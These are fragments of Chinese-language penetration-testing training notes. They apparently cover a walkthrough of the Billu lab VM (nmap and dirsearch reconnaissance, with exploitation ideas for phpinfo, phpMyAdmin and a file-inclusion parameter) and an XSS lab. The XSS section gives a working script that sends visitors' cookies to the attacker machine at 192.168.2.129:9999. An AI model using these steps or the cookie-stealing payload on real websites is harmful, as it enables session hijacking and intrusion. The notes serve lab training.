...
| 机器 | IP |
|:------|:------|
| Billu靶机 | 192.168.2.128 |
| kali虚拟机 | 192.168.2.129 |
| Windows宿主机 | 192.168.2.1 |
...
```shell
nmap -T4 -A -v 192.168.2.128-253 -p-
nmap -T4 -A -v 192.168.2.128-253 -p 22,80
```
- -T4 时间模板，0-5越大越快。
- -A 高级扫描，开启端口对应服务、操作系统、版本检测等。
- -v 事无巨细，全部输出。
...
```shell
python3 dirsearch.py -u http://192.168.2.128
```

## 逐个目录测试

dirsearch扫描结果和利用思路如下。
| 可用目录 | http code | 利用思路 |
|:-|:-|:-|
| /add.php | 200 | 文件上传功能。测试上传文件，发现没有与后端交互，说明此文件不完整，利用价值不大。|
| /c | 200 | 打开是个空白页面。一般是/c/index.php或者/c/index.html，但访问发现没有/c/index.php或者/c/index.html。说明/c是实现业务逻辑的功能代码，大概率会被包含在其他文件。 |
| /head.php  | 200 | 打开是个图片。背景图片，被包含在其他代码里。 |
| /images | 200 | 放图片的目录。 |
| /in | 200 | phpinfo页面，高价值目标！包含版本、根目录等信息。 |
| /panel.php | 302 | /panel.php → index.php。重定向一般是跳转到登录界面验证身份，初步判断是网站后台。 |
| /phpmy | 200 | (/phpmy/index.php) phpmyadmin数据库管理工具。 |
| /show.php | 200 | 能打开，空白页面。说明是被包含的。 
| /test.php | 200 | 'file' parameter is empty. Please provide file path in 'file' parameter. 这里不是文件上传，是文件包含。被包含文件会在这个页面执行，file文件会在/test页面执行。 |
...
20251202中关村互联网教育创新中心培训 XSS 靶场案例，服务器IP如下。
...
3. 发帖子。
    ...
    ```javascript
    <script>new Image().src="http://192.168.2.129:9999/?c="+document.cookie;</script> // +字符串拼接
    ```
